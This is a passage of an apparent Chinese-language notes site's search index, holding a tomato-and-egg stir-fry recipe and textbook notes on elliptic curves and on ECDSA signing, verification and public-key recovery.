</ul>"},{"location":"cooking/xihongshichaojidan.html","title":"\u897f\u7ea2\u67ff\u200b\u7092\u9e21\u86cb","text":""},{"location":"cooking/xihongshichaojidan.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u897f\u7ea2\u67ff\u200b \u200b\u9e21\u86cb\u200b \u200b\u756a\u8304\u9171\u200b</p>"},{"location":"cooking/xihongshichaojidan.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u6e05\u6d17\u200b\u897f\u7ea2\u67ff\u200b\uff0c\u200b\u53ef\u200b\u9009\u200b\u5265\u76ae\u200b\uff0c\u200b\u5207\u6210\u200b\u5c0f\u200b\u5757\u200b</li> <li>\u200b\u714e\u200b\u9e21\u86cb\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b \u200b\u714e\u86cb\u200b \u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u6839\u636e\u200b\u53e3\u5473\u200b\u9009\u62e9\u200b\u505a\u6cd5\u200b</li> <li>\u200b\u714e\u200b\u597d\u200b\u9e21\u86cb\u200b\u540e\u200b\u628a\u200b\u9e21\u86cb\u200b\u53d6\u51fa\u200b\uff0c\u200b\u5207\u6210\u200b\u5c0f\u200b\u7247\u200b</li> <li>\u200b\u4e0b\u5207\u200b\u597d\u200b\u7684\u200b\u897f\u7ea2\u67ff\u200b\u7ffb\u7092\u200b\uff0c\u200b\u540e\u200b\u518d\u200b\u52a0\u5165\u200b\u9e21\u86cb\u200b\uff0c\u200b\u52a0\u200b\u756a\u8304\u9171\u200b\u8c03\u5473\u200b</li> </ol>"},{"location":"cooking/xihongshichaojidan.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-04-15: \u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\uff0c200g \u200b\u9e21\u86cb\u200b\u52a0\u200b 300g \u200b\u4e2a\u5934\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\u7684\u200b\u6c34\u679c\u200b\u756a\u8304\u200b\uff0c\u200b\u4e0d\u597d\u200b\u5265\u76ae\u200b\uff0c\u200b\u5077\u61d2\u200b\u6ca1\u6709\u200b\u6309\u7167\u200b\u89c6\u9891\u200b\u91cc\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5207\u5f00\u200b\u76ae\u200b\u518d\u200b\u70ed\u6c34\u200b\u716e\u200b\u518d\u200b\u6495\u76ae\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u5e26\u200b\u7740\u200b\u4e00\u70b9\u200b\u76ae\u200b\u53e3\u611f\u200b\u4e5f\u200b\u8fd8\u884c\u200b\uff0c\u200b\u53ef\u80fd\u200b\u548c\u200b\u54c1\u79cd\u200b\u6709\u5173\u200b\uff1b\u200b\u52a0\u200b\u4e86\u200b\u756a\u8304\u9171\u200b\uff0c\u200b\u5473\u9053\u200b\u66f4\u597d\u200b\u4e00\u4e9b\u200b</li> </ul>"},{"location":"cooking/xihongshichaojidan.html#_5","title":"\u53c2\u8003","text":"<ul> <li>40 \u200b\u5e74\u8001\u200b\u53a8\u505a\u200b\u897f\u7ea2\u67ff\u200b\u7092\u9e21\u86cb\u200b\uff0c\u200b\u5473\u9053\u200b\u771f\u7684\u200b\u4e0d\u200b\u4e00\u822c\u200b\uff0c\u200b\u4e0d\u200b\u52a0\u200b\u756a\u8304\u9171\u200b\u597d\u5403\u200b\u6709\u200b\u79d8\u8bc0\u200b</li> </ul>"},{"location":"cryptography/ec.html","title":"\u692d\u5706\u200b\u66f2\u7ebf","text":""},{"location":"cryptography/ec.html#weierstrass","title":"Weierstrass \u200b\u5b9a\u4e49","text":"<p>\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u7684\u200b\u4e00\u79cd\u200b\u5b9a\u4e49\u200b\u662f\u200b\uff0c\u200b\u5728\u200b \\(\\mathbb{R}^2\\) \u200b\u4e0a\u200b\u7684\u200b\u66f2\u7ebf\u200b\uff0c\u200b\u66f2\u7ebf\u200b\u4e0a\u200b\u6bcf\u200b\u4e00\u70b9\u200b \\((x, y)\\) \u200b\u6ee1\u8db3\u200b\uff1a</p> \\[ y^2 = x^3 + ax + b \\] <p>\u200b\u8981\u6c42\u200b \\(4a^3 + 27b^2 \\ne 0\\)\uff0c\u200b\u8fd9\u79cd\u200b\u5f62\u5f0f\u200b\u53eb\u505a\u200b Weierstrass form\u3002</p>"},{"location":"cryptography/ec.html#_2","title":"\u8fd0\u7b97","text":"<p>\u200b\u5728\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u4e0a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5b9a\u4e49\u200b\u70b9\u200b\u4e4b\u95f4\u200b\u7684\u200b\u52a0\u6cd5\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u6ee1\u8db3\u200b\uff1a</p> <ul> <li>\u200b\u5355\u4f4d\u200b\u5143\u200b \\(O\\) \u200b\u4e3a\u200b\u65e0\u7a77\u8fdc\u200b\u70b9\u200b</li> <li>\u200b\u5bf9\u4e8e\u200b\u66f2\u7ebf\u200b\u4e0a\u200b\u4e24\u70b9\u200b \\(P\\) \u200b\u548c\u200b \\(Q\\)\uff0c\u200b\u53d6\u200b\u7ecf\u8fc7\u200b \\(P\\) \u200b\u548c\u200b \\(Q\\) \u200b\u7684\u200b\u76f4\u7ebf\u200b\uff0c\u200b\u8fd9\u200b\u6761\u200b\u76f4\u7ebf\u200b\u4e0e\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u76f8\u4ea4\u200b\u4e8e\u200b\u6700\u200b\u591a\u200b\u4e09\u4e2a\u200b\u70b9\u200b\uff08\u200b\u56e0\u4e3a\u200b\u65b9\u7a0b\u200b\u662f\u200b\u4e09\u6b21\u200b\u7684\u200b\uff09\uff0c\u200b\u5176\u4e2d\u200b\u4e24\u4e2a\u200b\u70b9\u200b\u662f\u200b \\(P\\) \u200b\u548c\u200b \\(Q\\)\uff0c\u200b\u5982\u679c\u200b\u7b2c\u4e09\u4e2a\u200b\u70b9\u200b\u5b58\u5728\u200b\u4e14\u200b\u4e0d\u200b\u548c\u200b \\(P\\)\u3001\\(Q\\) \u200b\u91cd\u5408\u200b\uff0c\u200b\u8bb0\u200b\u7b2c\u4e09\u4e2a\u200b\u70b9\u4e3a\u200b \\(R\\)\uff0c\u200b\u90a3\u4e48\u200b\u6ee1\u8db3\u200b \\(P + Q + R = O\\)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b \\(P + Q = -R\\)</li> <li>\u200b\u5bf9\u200b\u4e00\u70b9\u200b \\(R=(x_P, y_P)\\)\uff0c\u200b\u5176\u200b\u76f8\u53cd\u6570\u200b \\(-R=(x_P, -y_P)\\)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6cbf\u200b X \u200b\u8f74\u5bf9\u79f0\u200b\u7684\u200b\u70b9\u200b</li> </ul> <p>\u200b\u4e0b\u9762\u200b\u6765\u200b\u63a8\u5bfc\u200b\u4e00\u4e0b\u200b \\(P\\) \\(Q\\) \\(R\\) \u200b\u4e09\u70b9\u200b\u95f4\u200b\u7684\u200b\u5750\u6807\u200b\u5173\u7cfb\u200b\u3002\u200b\u8bbe\u200b \\(P=(x_P, y_P), Q=(x_Q, y_Q), R=(x_R, y_R)\\)\uff0c\u200b\u9996\u5148\u200b\u5047\u8bbe\u200b \\(x_P \\ne x_Q\\)\uff0c\u200b\u90a3\u4e48\u200b\u7ecf\u8fc7\u200b \\(P\\) \\(Q\\) \u200b\u7684\u200b\u76f4\u7ebf\u200b\u7684\u200b\u65b9\u7a0b\u200b\u4e3a\u200b</p> \\[ y = kx + b \\] <p>\u200b\u5e26\u5165\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u65b9\u7a0b\u200b\uff0c\u200b\u5f97\u5230\u200b</p> \\[\\begin{align} (kx + b)^2 &amp;= x^3 + ax + b \\\\ k^2x^2 + 2kbx + b^2 &amp;= x^3 + ax + b \\\\ x^3 - k^2x^2 - 2kbx + ax + b - b^2 &amp;= 0 \\end{align}\\] <p>\u200b\u56e0\u4e3a\u200b \\(P\\) \\(Q\\) \\(R\\) \u200b\u662f\u200b\u66f2\u7ebf\u200b\u4e0e\u200b\u76f4\u7ebf\u200b\u76f8\u4ea4\u200b\u7684\u200b\u4e09\u70b9\u200b\uff0c\u200b\u4e0a\u200b\u5f0f\u200b\u7b49\u4ef7\u200b\u4e8e\u200b</p> \\[ (x-x_P)(x-x_Q)(x-x_R) = x^3-(x_P+x_Q+x_R)x^2+(x_Px_Q+x_Qx_R+x_Rx_P)x-x_Px_Qx_R \\] <p>\u200b\u4e24\u4e2a\u200b\u65b9\u7a0b\u200b\u7684\u200b\u7cfb\u6570\u200b\u76f8\u540c\u200b\uff0c\u200b\u5219\u200b</p> \\[\\begin{align} k^2 &amp;= x_P + x_Q + x_R \\\\ x_R &amp;= k^2 - x_P - x_Q \\\\ k &amp;= \\frac{y_P - y_Q}{x_P - x_Q} \\\\ x_R &amp;= (\\frac{y_P - y_Q}{x_P - x_Q})^2 - x_P - x_Q \\\\ y_R &amp;= y_P + k(x_R - x_P) \\end{align}\\] <p>\u200b\u5373\u200b \\(R=((\\frac{y_P - y_Q}{x_P - x_Q})^2 - x_P - x_Q, y_P + \\frac{y_P - y_Q}{x_P - x_Q}((\\frac{y_P - y_Q}{x_P - x_Q})^2 - x_P - x_Q - x_P))\\)\u3002\u200b\u7531\u4e8e\u200b \\(P + Q = -R\\)\uff0c\u200b\u6240\u4ee5\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u4e0a\u70b9\u200b\u7684\u200b\u52a0\u6cd5\u200b\u5728\u200b \\(x_P \\ne x_Q\\) \u200b\u65f6\u200b\u8fd0\u7b97\u200b\u7ed3\u679c\u200b\u4e3a\u200b</p> \\[ (x_P, y_P) + (x_Q, y_Q) = ((\\frac{y_P - y_Q}{x_P - x_Q})^2 - x_P - x_Q, - y_P - \\frac{y_P - y_Q}{x_P - x_Q}((\\frac{y_P - y_Q}{x_P - x_Q})^2 - x_P - x_Q - x_P)) \\] <p>\u200b\u5982\u679c\u200b \\(x_P = x_Q\\)\uff0c\u200b\u90a3\u4e48\u200b\u5206\u200b\u60c5\u51b5\u200b\u8ba8\u8bba\u200b\uff1a</p> <ol> <li>\u200b\u5982\u679c\u200b \\(y_P = y_Q\\)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b \\(P + Q\\)\uff0c\u200b\u6b64\u65f6\u200b \\(PQ\\) \u200b\u8fde\u200b\u7684\u200b\u76f4\u7ebf\u200b\u662f\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u5728\u200b \\(P\\) \u200b\u70b9\u200b\u7684\u200b\u5207\u7ebf\u200b\uff0c\u200b\u5207\u7ebf\u200b\u4e0a\u200b\u7684\u200b\u659c\u7387\u200b\u7684\u200b\u8ba1\u7b97\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u5bf9\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u65b9\u7a0b\u200b\u4e24\u4fa7\u200b\u5bf9\u200b \\(x\\) \u200b\u6c42\u5bfc\u200b\uff0c\u200b\u5f97\u5230\u200b \\(2y \\frac{\\mathrm{d}y}{\\mathrm{d}x} = 3x^2+a\\)\uff0c\u200b\u56e0\u6b64\u200b\u659c\u7387\u200b \\(k = \\frac{3x_P^2+a}{2y_P}\\)\uff0c\u200b\u5269\u4e0b\u200b\u7684\u200b\u8ba1\u7b97\u200b\u8fc7\u7a0b\u200b\u548c\u200b\u4e0a\u9762\u200b\u4e00\u6837\u200b\u3002</li> <li>\u200b\u5982\u679c\u200b \\(y_P \\ne y_Q\\)\uff0c\u200b\u6839\u636e\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u7684\u200b\u5bf9\u79f0\u6027\u200b\uff0c\u200b\u90a3\u4e48\u200b \\(y_P = - y_Q\\)\uff0c\u200b\u6b64\u65f6\u200b \\(P + Q = O\\)\u3002</li> </ol> <p>\u200b\u8fd9\u90e8\u5206\u200b\u63a8\u5bfc\u200b\u53c2\u8003\u200b\u4e86\u200b Wikipedia\u3002</p> <p>\u200b\u9664\u4e86\u200b\u52a0\u6cd5\u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u5b9a\u4e49\u200b\u6570\u4e58\u200b\uff1a\u200b\u6574\u6570\u200b \\(n\\) \u200b\u4e58\u4ee5\u200b\u70b9\u200b \\(P\\)\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b\u6c42\u200b \\(n\\) \u200b\u4e2a\u200b \\(P\\) \u200b\u7684\u200b\u548c\u200b\u3002</p>"},{"location":"cryptography/ec.html#_3","title":"\u6709\u9650\u200b\u57df\u200b\u4e0a\u200b\u7684\u200b\u692d\u5706\u200b\u66f2\u7ebf","text":"<p>\u200b\u4ece\u200b\u4e0a\u9762\u200b\u7684\u200b\u89c2\u5bdf\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\uff0c\u200b\u5728\u200b\u8ba1\u7b97\u200b\u4e24\u70b9\u200b\u95f4\u200b\u7684\u200b\u52a0\u6cd5\u200b\u8fd0\u7b97\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5bf9\u200b X Y \u200b\u5750\u6807\u200b\u7684\u200b\u8ba1\u7b97\u200b\u53ea\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e86\u200b\u52a0\u51cf\u4e58\u9664\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u7684\u200b\u5750\u6807\u200b\u6362\u200b\u5230\u200b\u5176\u4ed6\u200b\u57df\u200b\u4e0a\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u5c40\u9650\u4e8e\u200b\u4e0a\u9762\u200b\u4f7f\u7528\u200b\u7684\u200b \\(\\mathbb{R}\\)\u3002\u200b\u4f8b\u5982\u200b\u5728\u200b\u5bc6\u7801\u5b66\u200b\u4e2d\u200b\uff0c\u200b\u901a\u5e38\u200b\u4f1a\u200b\u4f7f\u7528\u200b \\(F_p\\) \u200b\u7d20\u6570\u200b\u57df\u200b\u6216\u8005\u200b \\(GF(2^m)\\)\u3002\u200b\u4f8b\u5982\u200b\u53d6\u200b\u7d20\u6570\u200b\u57df\u200b \\(F_p\\) \u200b\u4e0a\u200b\u7684\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\uff0c\u200b\u90a3\u4e48\u200b\u70b9\u200b\u7684\u200b\u5750\u6807\u200b\u6ee1\u8db3\u200b</p> \\[ y^2 \\equiv x^3 + ax + b \\pmod p \\] <p>\u200b\u4f8b\u5982\u200b\u5728\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u5bc6\u7801\u5b66\u200b\u4e2d\u200b\u5e38\u7528\u200b\u7684\u200b secp192r1 \u200b\u66f2\u7ebf\u200b\uff0c\u200b\u5c31\u662f\u200b\u5728\u200b\u7d20\u6570\u200b\u57df\u200b\u4e0a\u200b\u5b9a\u4e49\u200b\u7684\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\uff1a</p> \\[\\begin{align} p &amp;= 6277101735386680763835789423207666416083908700390324961279 \\\\ a &amp;= p - 3 \\\\ b &amp;= 2455155546008943817740293915197451784769108058161191238065 \\end{align}\\] <p>\u200b\u6b64\u65f6\u200b\u9664\u6cd5\u200b\u8fd0\u7b97\u200b\u5b9a\u4e49\u200b\u4e3a\u200b\u5728\u200b\u7d20\u6570\u200b\u57df\u200b\u4e0a\u4e58\u200b\u4ee5\u200b\u4e58\u6cd5\u200b\u9006\u5143\u200b\u7684\u200b\u8fd0\u7b97\u200b\u3002</p>"},{"location":"cryptography/ec.html#montgomery-curve","title":"Montgomery curve","text":"<p>\u200b\u5728\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u5bc6\u7801\u5b66\u200b\u4e2d\u200b\uff0c\u200b\u6709\u65f6\u5019\u200b\u4f1a\u200b\u7528\u200b Montgomery curve \u200b\u6765\u200b\u63cf\u8ff0\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u4e0a\u9762\u200b\u7684\u200b Weierstrass form\u3002\u200b\u5b83\u200b\u7684\u200b\u5f62\u5f0f\u200b\u5982\u4e0b\u200b\uff1a</p> \\[ By^2 = x^3 + Ax^2 + x \\] <p>\u200b\u6ee1\u8db3\u200b \\(B(A^2-4) \\ne 0\\)\u3002</p> <p>\u200b\u4f8b\u5982\u200b Curve25519 \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u5728\u200b\u7d20\u6570\u200b\u57df\u200b\u4e0a\u200b\u7684\u200b Montgomery curve\uff1a</p> \\[\\begin{align} y^2 &amp;\\equiv x^3 + 486662 x^2 + x \\pmod p \\\\ p &amp;= 2^{255} - 19 \\end{align}\\] <p>\u200b\u4f7f\u7528\u200b Montgomery curve \u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\u80fd\u591f\u200b\u5b9e\u73b0\u200b\u66f4\u5feb\u200b\u7684\u200b\u8fd0\u7b97\u200b\u3002</p> <p>Montgomery \u200b\u66f2\u7ebf\u200b\u53ef\u4ee5\u200b\u8f6c\u6362\u200b\u4e3a\u200b Weierstrass \u200b\u66f2\u7ebf\u200b\uff0c\u200b\u4e0b\u9762\u200b\u7ed9\u51fa\u200b\u8f6c\u6362\u200b\u8fc7\u7a0b\u200b\uff1a</p> <p>\u200b\u8003\u8651\u200b\u5230\u200b Montgomery \u200b\u76f8\u6bd4\u200b Weierstrass \u200b\u5de6\u4fa7\u200b\u591a\u200b\u4e86\u200b\u4e00\u4e2a\u200b \\(B\\) \u200b\u7684\u200b\u56e0\u5b50\u200b\uff0c\u200b\u91c7\u7528\u200b\u53d8\u91cf\u200b\u4ee3\u6362\u200b\u628a\u200b\u5b83\u200b\u6d88\u9664\u200b\uff0c</p> \\[\\begin{align} By^2 &amp;= x^3 + Ax^2 + x \\\\ u &amp;= \\frac{x}{B} \\\\ v &amp;= \\frac{y}{B} \\\\ B(vB)^2 &amp;= (uB)^3 + A(uB)^2 + uB \\\\ v^2 &amp;= u^3 + \\frac{A}{B}u^2 + \\frac{1}{B^2}u \\end{align}\\] <p>\u200b\u6b64\u65f6\u200b\u8ddd\u79bb\u200b Weierstrass form \u200b\u5c31\u200b\u5dee\u200b\u7b49\u5f0f\u200b\u53f3\u8fb9\u200b\u7684\u200b \\(u\\) \u200b\u7684\u200b\u6b21\u6570\u200b\uff0c\u200b\u76ee\u6807\u200b\u662f\u200b \\(x^3 + ax + b\\)\uff0c\u200b\u73b0\u5728\u200b\u662f\u200b \\(x^3 + ax^2 + x\\)\uff0c\u200b\u56e0\u6b64\u200b\u8981\u200b\u628a\u200b \\(x^2\\) \u200b\u9879\u200b\u6d88\u6389\u200b\uff0c\u200b\u8bbe\u200b \\(u = t - \\frac{A}{3B}\\)\uff0c\u200b\u5219\u200b</p> \\[\\begin{align} v^2 &amp;= u^3 + \\frac{A}{B}u^2 + \\frac{1}{B^2}u \\\\ u &amp;= t - \\frac{A}{3B} \\\\ v^2 &amp;= (t - \\frac{A}{3B})^3 + \\frac{A}{B}(t - \\frac{A}{3B})^2 + \\frac{1}{B^2}(t - \\frac{A}{3B}) \\\\ v^2 &amp;= t^3 + \\frac{3-A^2}{3B^2}t + \\frac{2A^3-9A}{27B^3} \\end{align}\\] <p>\u200b\u6b64\u65f6\u200b \\((v, t)\\) \u200b\u5c31\u662f\u200b\u7b26\u5408\u200b Weierstrass form \u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u4e0a\u200b\u7684\u200b\u4e00\u70b9\u200b\u3002</p> <p>\u200b\u8fd9\u90e8\u5206\u200b\u63a8\u5bfc\u200b\u53c2\u8003\u200b\u4e86\u200b Wikipedia\u3002</p>"},{"location":"cryptography/ec.html#twisted-edwards-curve","title":"Twisted Edwards curve","text":"<p>\u200b\u7b2c\u4e09\u79cd\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u7684\u200b\u63cf\u8ff0\u200b\u65b9\u6cd5\u200b\u662f\u200b Twisted Edwards curve\uff0c\u200b\u5b9a\u4e49\u200b\u5982\u4e0b\u200b\uff1a</p> \\[ ax^2 + y^2 = 1 + dx^2y^2 \\] <p>Twisted Edwards curve \u200b\u7684\u200b\u70b9\u200b\u7684\u200b\u52a0\u6cd5\u200b\u5982\u4e0b\u200b\uff1a</p> \\[ (x_1, y_1) + (x_2, y_2) = (\\frac{x_1y_2+y_1x_2}{1+dx_1x_2y_1y_2},\\frac{y_1y_2-ax_1x_2}{1-dx_1x_2y_1y_2}) \\] <p>\u200b\u70b9\u200b\u53ef\u4ee5\u200b\u7528\u200b\u9f50\u6b21\u200b\u5750\u6807\u200b\u8868\u793a\u200b\uff1a\\((X, Y, Z, T)\\) \u200b\u5bf9\u5e94\u200b \\((x,y)\\) \u200b\u6ee1\u8db3\u200b \\(x=X/Z, y=Y/Z, x*y=T/Z\\)\u3002</p> <p>Twisted Edwards curve \u200b\u53ef\u4ee5\u200b\u7528\u200b\u5728\u200b EdDSA \u200b\u7b7e\u540d\u200b\u7b97\u6cd5\u200b\u4e2d\u200b\u3002</p>"},{"location":"cryptography/ecdsa.html","title":"ECDSA","text":"<p>ECDSA \u200b\u662f\u200b\u4e00\u4e2a\u200b\u57fa\u4e8e\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u7684\u200b\u7b7e\u540d\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u4f7f\u7528\u200b\u65f6\u200b\u9700\u8981\u200b\u786e\u5b9a\u200b\u4e00\u4e2a\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5b83\u200b\u7684\u200b base point \\(G\\)\uff0c\u200b\u4e14\u200b \\(G\\) \u200b\u7684\u200b\u9636\u662f\u200b\u7d20\u6570\u200b \\(n\\)\u3002</p> <p>\u200b\u672c\u6587\u200b\u4e3b\u8981\u200b\u53c2\u8003\u200b\u4e86\u200b ECDSA - Wikipedia\u3002</p>"},{"location":"cryptography/ecdsa.html#key-pair","title":"\u751f\u6210\u200b key pair","text":"<p>\u200b\u751f\u6210\u200b key pair \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u79c1\u94a5\u200b\u662f\u200b\u6574\u6570\u200b \\(d_A \\in [1, n-1]\\)\uff0c\u200b\u90a3\u4e48\u200b\u516c\u94a5\u200b\u5c31\u662f\u200b\u5706\u9525\u66f2\u7ebf\u200b\u4e0a\u200b\u4e00\u70b9\u200b \\(Q_A = d_A \\times G\\)\uff0c\u200b\u8fd9\u91cc\u200b \\(\\times\\) \u200b\u8868\u793a\u200b\u6574\u6570\u200b\u4e0e\u200b\u5706\u9525\u66f2\u7ebf\u200b\u4e0a\u200b\u4e00\u70b9\u200b\u7684\u200b\u4e58\u6cd5\u200b\u3002</p>"},{"location":"cryptography/ecdsa.html#_1","title":"\u7b7e\u540d","text":"<p>\u200b\u7b7e\u540d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u7ed9\u5b9a\u200b\u7684\u200b\u6d88\u606f\u200b \\(m\\)\uff0c\u200b\u7b7e\u540d\u200b\u6d41\u7a0b\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u8ba1\u7b97\u200b\u54c8\u5e0c\u200b\uff1a\\(e = \\mathrm{HASH}(m)\\)\uff0c\u200b\u4f8b\u5982\u200b\u7528\u200b SHA \u200b\u7cfb\u5217\u200b\u7684\u200b\u54c8\u5e0c\u200b\u7b97\u6cd5\u200b</li> <li>\u200b\u8003\u8651\u200b\u5230\u200b \\(e\\) \u200b\u7684\u200b\u4f4d\u6570\u200b\u53ef\u80fd\u200b\u6bd4\u200b \\(n\\) \u200b\u7684\u200b\u4f4d\u6570\u200b\u66f4\u200b\u591a\u200b\uff0c\u200b\u53d6\u200b \\(e\\) \u200b\u7684\u200b\u9ad8\u4f4d\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u4f4d\u6570\u200b\u548c\u200b \\(n\\) \u200b\u4e00\u81f4\u200b\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u8bb0\u200b\u4e3a\u200b \\(z\\)</li> <li>\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u5bc6\u7801\u5b66\u200b\u5b89\u5168\u200b\u7684\u200b\u968f\u673a\u6570\u200b \\(k \\in [1, n-1]\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(k \\times G\\)\uff0c\u200b\u53d6\u200b\u5b83\u200b\u7684\u200b X \u200b\u5750\u6807\u200b\u4e3a\u200b \\(x_1\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(r = x_1 \\bmod n\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(s = k^{-1}(z + r d_A) \\bmod n\\)</li> <li>\u200b\u5982\u679c\u200b \\(r\\) \u200b\u6216\u8005\u200b \\(s\\) \u200b\u7b49\u4e8e\u200b 0\uff0c\u200b\u53d6\u65b0\u200b\u7684\u200b \\(k\\) \u200b\u518d\u200b\u91cd\u8bd5\u200b</li> <li>\u200b\u5f97\u5230\u200b\u7684\u200b ECDSA \u200b\u7b7e\u540d\u200b\u5c31\u662f\u200b \\((r, s)\\) \u200b\u4e24\u4e2a\u200b\u6570\u200b</li> </ol>"},{"location":"cryptography/ecdsa.html#_2","title":"\u9a8c\u8bc1","text":"<p>\u200b\u9a8c\u8bc1\u200b\u7b7e\u540d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5df2\u77e5\u200b \\(r, s, m, Q_A\\)\uff0c\u200b\u6309\u7167\u200b\u4e0b\u9762\u200b\u7684\u200b\u6d41\u7a0b\u200b\u8fdb\u884c\u200b\uff1a</p> <ol> <li>\u200b\u524d\u200b\u4e24\u6b65\u200b\u548c\u200b\u8ba1\u7b97\u200b\u7b7e\u540d\u200b\u7684\u200b\u7b97\u6cd5\u200b\u4e00\u81f4\u200b\uff0c\u200b\u6c42\u200b\u54c8\u5e0c\u200b\u548c\u200b\u622a\u65ad\u200b\u540e\u200b\u5f97\u5230\u200b \\(z\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(u_1 = zs^{-1} \\bmod n, u_2 = rs^{-1} \\bmod n\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(u_1 \\times G + u_2 \\times Q_A\\)\uff0c\u200b\u53d6\u200b\u5b83\u200b\u7684\u200b X \u200b\u5750\u6807\u200b\u4e3a\u200b \\(x_2\\)</li> <li>\u200b\u5982\u679c\u200b \\(r \\equiv x_2 \\pmod n\\)\uff0c\u200b\u5219\u200b\u7b7e\u540d\u200b\u5408\u6cd5\u200b</li> </ol> <p>\u200b\u4e0a\u9762\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u5ffd\u7565\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u8fb9\u754c\u200b\u60c5\u51b5\u200b\u7684\u200b\u68c0\u67e5\u200b\uff0c\u200b\u8be6\u7ec6\u200b\u7248\u672c\u200b\u89c1\u200b Wikipedia\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u8fdb\u884c\u200b\u9a8c\u7b97\u200b\uff1a</p> \\[\\begin{align} &amp; u_1 \\times G + u_2 \\times Q_A \\\\ &amp;= zs^{-1} \\times G + rs^{-1} \\times Q_A \\\\ &amp;= zs^{-1} \\times G + rs^{-1}d_A \\times G \\\\ &amp;= (zs^{-1} + rs^{-1}d_A) \\times G \\\\ &amp;= (z+rd_A)s^{-1} \\times G \\\\ &amp;= (z+rd_A)k(z+rd_A)^{-1} \\times G \\\\ &amp;= k \\times G \\end{align}\\] <p>\u200b\u7b49\u5f0f\u200b\u5de6\u8fb9\u200b\u7684\u200b X \u200b\u5750\u6807\u200b\u7b49\u4e8e\u200b\u7b49\u5f0f\u200b\u53f3\u8fb9\u200b\u7684\u200b X \u200b\u5750\u6807\u200b\uff0c\u200b\u7b49\u4ef7\u200b\u4e8e\u200b \\(r \\equiv x_2 \\pmod n\\)\uff0c\u200b\u9a8c\u7b97\u200b\u6ca1\u200b\u95ee\u9898\u200b\u3002</p>"},{"location":"cryptography/ecdsa.html#_3","title":"\u516c\u94a5\u200b\u6062\u590d","text":"<p>ECDSA \u200b\u652f\u6301\u200b\u516c\u94a5\u200b\u6062\u590d\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5df2\u77e5\u200b \\(r, s, m\\)\uff0c\u200b\u6062\u590d\u200b \\(Q_A\\)\u3002\u200b\u9996\u5148\u200b\u8fdb\u884c\u200b\u63a8\u5bfc\u200b\uff1a</p> \\[\\begin{align} Q_A &amp;= d_A \\times G \\\\ s &amp;= k^{-1}(z + rd_A) \\bmod n \\\\ sk &amp;= z + rd_A \\bmod n \\\\ sk \\times G &amp;= (z + rd_A) \\times G \\\\ rd_A \\times G &amp;= (sk - z) \\times G \\\\ Q_A &amp;= d_A \\times G = r^{-1}(sk-z) \\times G \\\\ Q_A &amp;= r^{-1}(s(k \\times G) - z \\times G) \\end{align}\\] <p>\u200b\u4e0a\u5f0f\u200b\u4e2d\u200b \\(r, s\\) \u200b\u5df2\u77e5\u200b\uff0c\\(z\\) \u200b\u53ef\u4ee5\u200b\u4ece\u200b \\(m\\) \u200b\u901a\u8fc7\u200b\u54c8\u5e0c\u200b\u8ba1\u7b97\u200b\u5f97\u51fa\u200b\uff0c\\(k \\times G\\) \u200b\u7684\u200b X 